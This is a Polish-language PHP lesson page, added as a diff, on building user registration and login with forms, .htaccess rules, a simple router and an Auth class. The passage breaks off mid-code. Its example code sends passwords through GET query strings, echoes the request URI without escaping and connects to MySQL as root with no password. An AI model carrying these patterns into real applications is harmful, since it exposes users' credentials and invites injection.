@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="pl" data-theme="dark">
+<head>
+    <script>
+      (function () {
+        try {
+          var c = document.cookie.split('; ').find(row => row.startsWith('theme='));
+          var t = c ? c.split('=')[1] : (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+          document.documentElement.setAttribute('data-theme', t);
+          if (t === 'dark') {
+            document.write('<style>html, body { background-color: #0b0f19; color: #e1e1e1; }</style>');
+          }
+        } catch (e) {}
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moduł 2\Rejestracja i logowanie - Koala-V</title>
+    <link rel="shortcut icon" href="/logo.svg" type="image/x-icon" />
+  <link rel="stylesheet" href="/css/course-style.css" />
+    <script type="module" src="/js/course-app.js"></script>
+</head>
+<body class="browser-firefox">
+    <div id="course-slug" style="display:none;">php</div>
+    <header>
+        <p class="site-logo medievalsharp-regular">
+            <a href="/">
+                <img src="/main-logo.svg" alt="" height="80" width="80" class="lazy-image lazy-image--loaded">
+                <span class="logo-text">Koala-V</span>
+            </a>
+        </p>
+        <div class="header-actions" id="header-actions">
+           <!-- Zdublowany theme-switcher z html zostal usuniety. js zajmie sie dodaniem jednego! -->
+        </div>
+
+        <div class="course-mobile-header">
+            <div class="header-left">
+                <button class="btn btn-icon btn-drawer btn-modules" aria-label="Moduły" title="Moduły">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
+                </button>
+            </div>
+            <div class="header-right">
+                <button class="btn btn-icon btn-drawer btn-toc" aria-label="Spis Treści" title="Spis Treści">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" x2="21" y1="6" y2="6"/><line x1="8" x2="21" y1="12" y2="12"/><line x1="8" x2="21" y1="18" y2="18"/><line x1="3" x2="3.01" y1="6" y2="6"/><line x1="3" x2="3.01" y1="12" y2="12"/><line x1="3" x2="3.01" y1="18" y2="18"/></svg>
+                </button>
+            </div>
+        </div>
+    </header>
+    
+    <div class="drawer-backdrop"></div>
+
+    <main class="course-page fade-in" id="course-page-shell">
+        <aside class="course-sidebar" id="course-lesson-content-nav-inner">
+            <nav class="module-menu drawer-left"><ul><li class="module">Moduł 0: Start z PHP</li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 0/PHP twoja personalna strona (BMI)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%200/PHP%20twoja%20personalna%20strona%20(BMI).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">PHP twoja personalna strona (BMI)</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 0/Reprezentacja wzorów brył (arytmetyka)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%200/Reprezentacja%20wzor%C3%B3w%20bry%C5%82%20(arytmetyka).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Reprezentacja wzorów brył (arytmetyka)</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 0/Operacje na tablicach (strict_type)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%200/Operacje%20na%20tablicach%20(strict_type).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Operacje na tablicach (strict_type)</a></li><li class="module">Moduł 1: Algorytmy szyfrujące</li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 1/Macierze (tablice wielowymiarowe)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%201/Macierze%20(tablice%20wielowymiarowe).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Macierze (tablice wielowymiarowe)</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 1/Operacje na ciągach (PHP CLI)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%201/Operacje%20na%20ci%C4%85gach%20(PHP%20CLI).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Operacje na ciągach (PHP CLI)</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 1/Szyfr Cezara"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%201/Szyfr%20Cezara.html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Szyfr Cezara</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 1/Szyfr Monoalfabetyczny z kluczem"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%201/Szyfr%20Monoalfabetyczny%20z%20kluczem.html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Szyfr Monoalfabetyczny z kluczem</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 1/Szyfr Vigenère’a"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%201/Szyfr%20Vigen%C3%A8re%E2%80%99a.html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Szyfr Vigenère’a</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 1/Szyfrowanie XOR i Binarka (OOP)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%201/Szyfrowanie%20XOR%20i%20Binarka%20(OOP).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Szyfrowanie XOR i Binarka (OOP)</a></li><li class="module">Moduł 2: Komunikacja z bazą danych</li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 2/Lista zadań (CRUD)"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%202/Lista%20zada%C5%84%20(CRUD).html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Lista zadań (CRUD)</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 2/Rejestracja i logowanie"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%202/Rejestracja%20i%20logowanie.html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Rejestracja i logowanie</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 2/Refaktoryzacja aplikacji"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%202/Refaktoryzacja%20aplikacji.html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Refaktoryzacja aplikacji</a></li><li class="lesson-item lesson" tabindex="0" data-path="Moduł 2/Akcje użytkowników i role"><a class="lesson-link" href="/courses/php/Pages/Modu%C5%82%202/Akcje%20u%C5%BCytkownik%C3%B3w%20i%20role.html" data-pjax style="text-decoration: none; color: inherit; display: block; width: 100%;">Akcje użytkowników i role</a></li></ul></nav>
+        </aside>
+        
+        <article id="course-lesson-content">
+            <h1>Rejestracja i logowanie</h1>
+<p>Kolejną po <span class="color-green">CRUD</span> funkcjonalnością backendową realizowaną w oparciu o system bazodanowy będzie system rejestracji i logowania. Jest to podstawa każdej aplikacji internetowej, która świadczy indywidualne widoki dla każdego użytkownika.</p>
+<details>
+<summary>Zasoby do lekcji</summary>
+
+<div style="display: flex;flex-direction: column;align-items: center;">
+        <p>Avatary</p>
+        <div style="display: flex;">
+            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
+                <img src="/public/Resources/php-files/awatary/AI_avatar_1.png" alt="Awatar wytworzony przez AI nr 1" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
+                <code>AI_avatar_1.png</code>
+            </div>
+            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
+                <img src="/public/Resources/php-files/awatary/AI_avatar_2.png" alt="Awatar wytworzony przez AI nr 2" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
+                <code>AI_avatar_2.png</code>
+            </div>
+            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
+                <img src="/public/Resources/php-files/awatary/AI_avatar_3.png" alt="Awatar wytworzony przez AI nr 3" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
+                <code>AI_avatar_3.png</code>
+            </div>
+            <div style="display: flex;flex-direction: column;align-items: center;margin: 5px;">
+                <img src="/public/Resources/php-files/awatary/AI_avatar_4.png" alt="Awatar wytworzony przez AI nr 4" style="height: 65px;width: 65px;border-radius: 50%;object-fit: cover;border: 2px solid #8d2121;">
+                <code>AI_avatar_4.png</code>
+            </div>
+        </div>
+    </div>
+
+<details>
+<summary>Login.html</summary>
+
+<p><small>login.html</small></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="pl"&gt;
+
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;PHP&lt;/title&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;a href="login.html"&gt;
+        &lt;h1&gt;PLATFORMA&lt;/h1&gt;
+    &lt;/a&gt;
+    &lt;header&gt;
+        &lt;div class="panel"&gt;
+            &lt;h2&gt;Rejestracja&lt;/h2&gt;
+            &lt;form action="" method="get"&gt;
+                &lt;div class="input-wrap"&gt;
+                    &lt;label for="username"&gt;Nazwa użytkownika:&lt;/label&gt;
+                    &lt;input type="text" name="username" id="username"&gt;
+                &lt;/div&gt;
+                &lt;div class="input-wrap"&gt;
+                    &lt;label for="login"&gt;Login: &lt;/label&gt;
+                    &lt;input type="text" name="login" id="login"&gt;
+                &lt;/div&gt;
+                &lt;div class="input-wrap"&gt;
+                    &lt;label for="pass"&gt;Hasło: &lt;/label&gt;
+                    &lt;input type="password" name="pass" id="pass"&gt;
+                &lt;/div&gt;
+                &lt;button&gt;Zarejestruj się&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+        &lt;div class="panel"&gt;
+            &lt;h2&gt;Logowanie&lt;/h2&gt;
+            &lt;form action="" method="get"&gt;
+                &lt;div class="input-wrap"&gt;
+                    &lt;label for="login"&gt;Login: &lt;/label&gt;
+                    &lt;input type="text" name="login" id="login"&gt;
+                &lt;/div&gt;
+                &lt;div class="input-wrap"&gt;
+                    &lt;label for="pass"&gt;Hasło: &lt;/label&gt;
+                    &lt;input type="password" name="pass" id="pass"&gt;
+                &lt;/div&gt;
+                &lt;button&gt;Zaloguj się&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;section&gt;
+            &lt;h3&gt;Najnowszy wpis&lt;/h3&gt;
+            &lt;div class="post"&gt;
+                &lt;div class="author"&gt;
+                    &lt;img src="./images/AI_avatar_1.png" alt="Awatar użytkownika "&gt;
+                    &lt;small&gt;Nazwa użytkownika&lt;/small&gt;
+                &lt;/div&gt;
+                &lt;p&gt;
+                    W nowszych standardach PHP 8 nie podaje się już soli w password_hash
+                &lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h3&gt;Losowy wpis&lt;/h3&gt;
+            &lt;p&gt;Kolejne losowanie o 13:47&lt;/p&gt;
+            &lt;div class="post"&gt;
+                &lt;div class="author"&gt;
+                    &lt;img src="./images/AI_avatar_3.png" alt="Awatar użytkownika "&gt;
+                    &lt;small&gt;Nazwa użytkownika&lt;/small&gt;
+                &lt;/div&gt;
+                &lt;p&gt;
+                    Informatyka to zarządzanie dostępem do informacji i przetwarzanie jej.
+                &lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;nav&gt;
+            &lt;h3&gt;Mało?&lt;/h3&gt;
+            &lt;a href="all-posts.html" class="nav"&gt;Sprawdź wszystkie wpisy&lt;/a&gt;
+        &lt;/nav&gt;
+    &lt;/main&gt;
+
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+</details>
+<details>
+<summary>all-posts.html</summary>
+
+<p><small>all‑posts.html</small></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="pl"&gt;
+
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;PHP&lt;/title&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;a href="login.html"&gt;
+        &lt;h1&gt;PLATFORMA&lt;/h1&gt;
+    &lt;/a&gt;
+    &lt;header&gt;
+
+        &lt;h2&gt;Dodaj nowy wpis&lt;/h2&gt;
+        &lt;form action="" method="post" class="post-form"&gt;
+            &lt;label for="new_post"&gt;Treść wpisu:&lt;/label&gt;
+            &lt;textarea name="new_post" id="new_post" cols="51" rows="5" maxlength="255" minlength="20"&gt;&lt;/textarea&gt;
+            &lt;button&gt;Zapisz wpis&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;section&gt;
+            &lt;h3&gt;Wszystkie wpisy&lt;/h3&gt;
+            &lt;div class="post"&gt;
+                &lt;div class="author"&gt;
+                    &lt;img src="./images/AI_avatar_1.png" alt="Awatar użytkownika "&gt;
+                    &lt;small&gt;Nazwa użytkownika&lt;/small&gt;
+                &lt;/div&gt;
+                &lt;p&gt;
+                    W nowszych standardach PHP 8 nie podaje się już soli w password_hash
+                &lt;/p&gt;
+            &lt;/div&gt;
+            &lt;hr&gt;
+            &lt;div class="post"&gt;
+                &lt;div class="author"&gt;
+                    &lt;img src="./images/AI_avatar_3.png" alt="Awatar użytkownika "&gt;
+                    &lt;small&gt;Nazwa użytkownika&lt;/small&gt;
+                &lt;/div&gt;
+                &lt;p&gt;
+                    Informatyka to zarządzanie dostępem do informacji i przetwarzanie jej.
+                &lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+
+    &lt;/main&gt;
+    &lt;nav class="paginacja"&gt;
+        &lt;a href="?offset=1" class="active"&gt;1&lt;/a&gt;
+        &lt;a href="?offset=2"&gt;2&lt;/a&gt;
+    &lt;/nav&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+</details>
+
+<details>
+<summary>style.css</summary>
+
+<p><small>style.css</small></p>
+<pre><code class="language-css">:root {
+    --color-text: #ebebeb;
+    --muted-text: #ccc;
+    --bg-layer-0: #111;
+    --bg-layer-1: #474747;
+    --table-border: #383838;
+    --thead-tr: #383838;
+    --tbody-tr-hover: #141414;
+    --tbody-td-hover: #181818;
+    --success: #296c29;
+    --info: #315a72;
+    --danger: #8d2121;
+}
+
+* {
+    -webkit-text-stroke: 0.4px rgb(0 0 0 / 20%);
+}
+
+body {
+    background-color: var(--bg-layer-0);
+    color: var(--color-text);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+#new-task {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+h1 {
+    color: #ccc;
+}
+
+button {
+    cursor: pointer;
+    border: 2px solid #fff2;
+    border-radius: 5px;
+    padding: 5px 10px;
+    font-family: monospace;
+    color: #fff;
+    background-color: var(--success);
+}
+
+.panel {
+    width: 250px;
+    background-color: var(--tbody-td-hover);
+    padding: 10px;
+    margin: 10px;
+}
+
+.panel button {
+    margin: 10px;
+    width: 100%;
+    max-width: 230px;
+}
+
+.panel form {
+    width: 250px;
+}
+
+
+
+label {
+    font-family: Verdana, Geneva, Tahoma, sans-serif;
+}
+
+label,
+input {
+    padding: 5px 10px;
+    margin: 0 10px;
+}
+
+input {
+    border: none;
+    border-radius: 2px;
+    color: var(--color-text);
+    background-color: var(--bg-layer-1);
+    display: block;
+    width: 100%;
+    max-width: 210px;
+}
+
+button:hover,
+input[type="text"]:hover {
+    filter: brightness(.9);
+}
+
+.paginacja {
+    width: fit-content;
+    margin: 0 auto;
+    display: block;
+}
+
+.paginacja a {
+    display: inline-block;
+    height: 30px;
+    width: 30px;
+    background-color: var(--info);
+    color: var(--color-text);
+    text-align: center;
+    font-size: 25px;
+    margin: 0 3px;
+    border-radius: 2px;
+}
+
+.paginacja a:hover {
+    background-color: var(--success);
+}
+
+.paginacja a.active {
+    background-color: var(--danger);
+}
+
+header {
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    max-width: 1200px;
+    margin: auto;
+}
+
+@media (max-width: 600px) {
+    header {
+        flex-direction: column;
+    }
+}
+
+.post {
+    width: 100%;
+    max-width: 800px;
+    margin: auto;
+    background-color: var(--bg-layer-1);
+    padding: 10px;
+}
+
+.post .author img {
+    height: 45px;
+    width: 45px;
+    border-radius: 50%;
+    object-fit: cover;
+    border: 2px solid var(--danger);
+}
+
+.post .author {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    font-family: cursive;
+}
+
+.post-form {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+}
+
+hr {
+    width: 75%;
+    max-width: 600px;
+    border: 2px solid var(--bg-layer-1);
+}
+
+textarea {
+    padding: 5px 10px;
+}
+
+textarea,
+.post p {
+    font-family: 'Times New Roman', Times, serif;
+    font-size: .9rem;
+    background-color: var(--tbody-td-hover);
+    color: var(--color-text);
+
+}
+
+.post p {
+    margin: -10px;
+    padding: 30px 10px;
+
+}
+
+
+nav,
+section:has(.post) {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 50px;
+    border-top: 3px solid var(--bg-layer-1);
+}
+
+nav {
+    width: 60%;
+    margin: auto;
+    border-top: 3px solid var(--success);
+}
+
+a.nav {
+    border: none;
+    border-radius: 10px;
+    background-color: #ffffff;
+    color: #7300ed;
+    padding: 5px 10px;
+    margin-bottom: 30px;
+    font-weight: bolder;
+    transition: ease-out 300ms all;
+
+}
+
+a.nav:hover {
+    color: #ffffff;
+    background-color: #7300ed;
+    transition: ease-in 300ms all;
+}
+</code></pre>
+</details>
+
+</details>
+
+
+<section class="lesson-section" data-lesson-section="true"><h2>💼 PHP i podejście projektowo-obiektowe</h2>
+<p>Wcześniej wykonaliśmy <span class="color-green">CRUD</span>a strukturalnie pomijając całe OOP. Przy zrealizowaniu trywialnego systemu logowania można by było zrobić podobnie. Jednak wejdźmy na poziom wyżej. Niech nasz projekt zacznie mieć architekturę, zamiast zbioru plików.</p>
+<p>Kolejnym dodatkiem który warto doinstalować w VS Code bedzie <span class="color-green">Material Icon Theme</span> od <span class="color-blue">Philipp Kief</span>. Jak widzisz na poniższym obrazku to rozwiązanie ułatwia orientację topograficzną i zachęca do stosowania odpowiednich nazw by uzyskać danę ikonkę katalogu:</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/material-icon-theme-i-struktura-projektu.webp" alt="Struktura katalogów projektu" width="1448" height="986" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Jak popatrzysz na powyższy obrazek to możesz już z tej struktury katalogowo‑plikowej wywnioskować jakie będą założenia architektury aplikacji.</p>
+<p>Mamy $3$ katalogi główne:</p>
+<ul>
+<li><code>backend</code>: zawiera w sobie dwa kolejne katlogi rozdzielając logikę i funkcjonalności od widoków czyli komponetów z których po uprzedniej preparcaji i zasianiu danymi system wyrenderuje i zwróci to co odbiorca ma zobaczyć w przglądarce</li>
+<li><code>CRUD</code>: Pliki z poprzedniej lekcji xP</li>
+<li><code>resources</code>: zasoby które serwer po prostu bedzie zwracał klientowi, gdy ten poda do nich odpowiednią ścieżkę. Mamy tu arkusz stylu i obrazki.</li>
+</ul>
+<p>Klasycznie w głównym katalogu tworzymy <code>index.php</code> i mamy też nowy plik bez nazwy ale z rozszerzeniem <code>.htaccess</code>.</p>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🪧 Serwer Apache i <code>.htaccess</code></h2>
+<p>Pliki <code>.htaccess</code> pozwalają na konfigurację serwera Apache w obrębie danego katalogu. Warto również doinstalować w VS Code <span class="color-green">APACHE CONF</span> od <span class="color-blue">mrmlnc</span> dla kolorowania składni.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/apache-conf-addon-vs-code.webp" alt="" width="1442" height="940" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Po co nam w ogóle ten plik?<br>Jeżeli serwer na którym hostujemy stronę korzysta z Apache, a właśnie tak działa wiekszość internetu to ten plik opisuje wstępne zasady dostępu do zasobów.</p>
+<div class="markdown-alert markdown-alert--warning">
+<p class="markdown-alert-title">
+<span class="alert-icon">🚧</span> Uwaga
+</p>
+<div class="markdown-alert-content">
+<p>Alternatywna usługa Nginx ignoruje pliki <code>.htaccess</code></p>
+
+</div>
+</div><p>Na początku w pliku musimy włączyć ślinik przepisywania żądań do katalogu projektu:</p>
+<pre><code class="language-yaml">RewriteEngine On
+</code></pre>
+<p>Na początku określmy dostępy do obu głównych katalogów:</p>
+<pre><code class="language-yaml"># 1. Blokada katalogu backend (nikt nie pobierze plików PHP)
+RewriteRule ^backend/ - [F]
+
+# 2. Resources mają być dostępne normalnie
+RewriteRule ^resources/ - [L]
+</code></pre>
+<ul>
+<li><code>RewriteRule</code>: zasada przepisania żądania</li>
+<li><code>^</code>: dowolna ilość znaków w URL (najczęściej chodzi o relację domeny strony a głównym katalogiem projektu)<ul>
+<li><code>[F]</code>: <span class="color-red"><code>Forbidden</code></span> - zabroniony dostęp <code>ERROR 403</code></li>
+<li><code>[L]</code>: <span class="color-green"><code>Last</code></span> - ostatnia reguła, przerwij przetwarzanie, nie rób już nic więcej</li>
+</ul>
+</li>
+</ul>
+<p>Pozostało jeszcze wskazać plik który będzie obsługiwał zapytania. W tej strukturze średnio ma to sens ale gdyby <code>index.php</code> miał inną nazwę lub lokalizację to w ten sposób można na niego nakierować ruch:</p>
+<pre><code class="language-yaml">RewriteRule ^ index.php [L]
+</code></pre>
+<p>Spójrz na poniższy obrazek. Dostęp do katalogu <code>backend</code> jest zabroniony i jednocześnie zawartość katalogu <code>resources/images</code> pozostała dostępna. Jednak jest małe zastrzeżenie. Projekt musi zostać obsłużony przez Apache. Dlatego przeniosłem jego zawartość do <code>C:/xampp/htdocs/</code>.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/działąnie-htaccess.webp" alt="" width="1918" height="1033" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Ok, no to mamy następującą konfigurację <code>.htaccesss</code>:</p>
+<pre><code class="language-yaml">RewriteEngine On
+RewriteRule ^backend/ - [F]
+RewriteRule ^resources/ - [L]
+RewriteRule ^ index.php [L]
+</code></pre>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🛣️ Wyznaczanie tras - ładne linki URL</h2>
+<p>Na każdej stronie którą odwiedzasz w internecie nie spotkasz się rozszerzeniami <code>.html</code> ani <code>.php</code> w adresie URL. Za te ładniejsze linki odpowiadaja mechanizm routera czyli klasy decydującej jaki plik ma się wywołać dla tego konkretnego adresu.</p>
+<p>Na początku zanim zaczniemy pisać trasowanie to przydało by się jakoś w php poznać wpisany adres URL. Wykorzystajmy do tego superglobalną <code>$_SERVER</code>. Odwoując się do wartości jej klucza <code>REQUEST_URI</code> otrzymamy resztę adresu po domenie i porcie.</p>
+<p>Jak widzisz URI nie lubi się z znakami poza ASCI w tym polskimi.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/superglobalna-server-i-wartość-request_uri.webp" alt="" width="1908" height="991" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Przypiszmy wartość <code>$_SERVER['REQUEST_URI']</code> zmiennej $uri i wykorzystajmy ją w <span class="color-gold"><code>switch</code></span> dołączając odpowiednie pliki html przy pomocy <code>include_once</code>:</p>
+<pre><code class="language-php">$uri = $_SERVER["REQUEST_URI"];
+
+switch($uri){
+    case "/": 
+        include_once("./backend/views/login.html"); 
+        break;
+    case "/wszystkie-wpisy": 
+        include_once("./backend/views/all-posts.html"); 
+        break;
+    default: include_once("./backend/views/error404.html"); 
+    break;
+}
+</code></pre>
+<p>Jak widzisz w relatywnie krótkim kodzie udało się zaimplementować ładne adresy i ukryć faktyczne nazwy plików. Przykładowo po wpisaniu <code>http://localhost/wszystkie-wpisy</code> php zwróci zawartość pliku <code>all-posts.html</code>.</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/powizoryczny-router.webp" alt="" width="1919" height="980" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Ale CSS się nie załadował! W obu plikach zmień:</p>
+<pre><code class="language-html">&lt;link rel="stylesheet" href="style.css"&gt;
+</code></pre>
+<p>na</p>
+<pre><code class="language-html">&lt;link rel="stylesheet" href="./resources/css/style.css"&gt;
+</code></pre>
+</section><section class="lesson-section" data-lesson-section="true"><h2>📝 Rejestracja użytkownika</h2>
+<p>Zmodyfikuj formularz rejestracji w pliku <code>login.html</code> dodając do atrybutu <code>action</code> wartość <code>/register</code>. Dodaj też brakującą kontrolkę do powtórnego wpisania hasła.<br>Zobacz że formularz przesyłamy metodą <span class="color-blue"><code>GET</code></span>, więc w adresie URL będą dopisane zmienne z formularza. co za tym idzie w pliku <code>router.php</code> przekształcimy metodą <code>explode</code> uzyskane URI na tablicę separując elementy znakiem <code>?</code> i inicjalizując zmienną <code>$uri</code> pierwszym elementem tej tablicy:</p>
+<pre><code class="language-php">$uri = \explode("?", (string)$_SERVER["REQUEST_URI"])[0];
+</code></pre>
+<p>Dzieki temu gdy adres wygląda tak:</p>
+<pre><code>http://localhost/register?username=xD&amp;login=xddd&amp;pass=Has%C5%82o&amp;repass=Powt%C3%B3rz+has%C5%82o
+</code></pre>
+<p>to w zmiennej <code>$uri</code> będzie tylko: <code>/register</code></p>
+<hr>
+<p>Przygotujmy teraz połączenie z bazą danych, bedziemy je przekazywać do instancji klas które będą wywoływać jakieś zapytania:</p>
+<pre><code class="language-php">$db = null;
+try {
+    $db = @new mysqli("localhost", "root", "");
+} catch (Exception $e) {
+    echo "Błąd bazy danych: " . $e-&gt;getMessage();
+    exit();
+}
+</code></pre>
+<blockquote>
+<p>Jeżeli nie uda nam się połączyć to przy pomocy <code>exit()</code> przerywamy dalsze wykonywanie kodu i zatrzymujemy całą aplikację.</p>
+</blockquote>
+</section><section class="lesson-section" data-lesson-section="true"><h2>🪪 Klasa Auth</h2>
+<p>Całą obsługą autoryzacji czyli logowaniem i rejestracją zajmie się klasa <code>Auth</code><br>W katalogu <code>/backend/core/</code> utwórz odpowiedni plik (<code>Auth.php</code>) o następującej zawartości:</p>
+<pre><code class="language-php">&lt;?php
+declare(strict_types=1);
+class Auth{
+
+    private $db;
+    function __construct(mysqli $db){
+        $this-&gt;db=$db;
+    }
+}
+</code></pre>
+<blockquote>
+<p>Klasycznie deklarujemy ścisły tryb typowania i tworzymy konstruktor klasy do której przekażemy uprzednio stworzone połączenie z bazą danych.</p>
+</blockquote>
+<p>Napiszmy teraz publiczną funkcję do rejestracji, która przyjmuje parametry: <code>username</code>, <code>login</code>, <code>pass</code>, <code>repass</code>:</p>
+<pre><code class="language-php">public function register(string $username, string $login, string $pass, string $repass): string{
+    return "Nie zaimlepmentowano jeszcze.";
+}
+</code></pre>
+<p>Zanim przejdziemy do implementcji upewnijmy się że jesteśmy w stanie poprawnie ją wywołać.<br>Na początku w <code>router.php</code>  za pomocą <code>require_once</code> doklejmy jej definicję: </p>
+<pre><code class="language-php">require_once("./backend/core/Auth.php");
+</code></pre>
+<p>Teraz możemy utworzyć dedykowany przypadek w switchu dla uri <code>/register</code>. Gdzie do nowej instancji klasy przekazujemy połączenie z bazą danych i wywołujemy jej publiczną metodę <code>register()</code> przekazując dane formularza z zapytania <span class="color-blue"><code>GET</code></span>.</p>
+<p>Aktualny stan (zwróć uwagę że nie ma <code>brake;</code> przed <code>case "/":</code>. Dzieki temu dla <code>/register</code> wywoła się też kod z <code>case "/":</code>):</p>
+<p><small>router.php</small></p>
+<pre><code class="language-php">&lt;?php
+declare(strict_types=1);
+require_once("./backend/core/Auth.php");
+$uri = \explode("?", (string)$_SERVER["REQUEST_URI"])[0];
+echo $uri;
+$db = null;
+try {
+    $db = @new mysqli("localhost", "root", "");
+} catch (Exception $e) {
+    echo "Błąd bazy danych: " . $e-&gt;getMessage();
+    exit();
+}
+switch($uri){
+    case "/register": 
+        $action = new Auth($db);
+        echo $action-&gt;register($_GET["username"], $_GET["login"], $_GET["pass"], $_GET["repass"]);
+    case "/": 
+        include_once("./backend/views/login.html"); 
+        break;
+    case "/wszystkie-wpisy": 
+        include_once("./backend/views/all-posts.html"); 
+        break;
+    default: include_once("./backend/views/error404.html"); 
+    break;
+}
+</code></pre>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/struktura-auth-bez-pełnej-implementacji-register.webp" alt="" width="1846" height="969" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+</section><section class="lesson-section" data-lesson-section="true"><h2>⚠️ Problem z nieistniejącymi zmiennymi</h2>
+<p>Zobaczmy co się stanie gdy ręcznie przejdziemy na adres <code>http://localhost/register</code>:</p>
+<img src="https://raw.githubusercontent.com/Edu-Koala-V/Courses/main/Courses/php/Images/register-router-errors-variable.webp" alt="" width="524" height="390" class="lazy-image" loading="lazy" decoding="async">
+
+
+
+<p>Do Auth przekazaliśmy nie istniejące zmienne.<br>Najprościej będzie to poprawić instrukcją warunkową <span class="color-gold"><code>if</code></span>:</p>
+<pre><code class="language-php">if(isset($_GET["username"]) &amp;&amp; isset($_GET["login"]) &amp;&amp; isset($_GET["pass"]) &amp;&amp; isset($_GET["repass"])){
+    $action = new Auth($db);
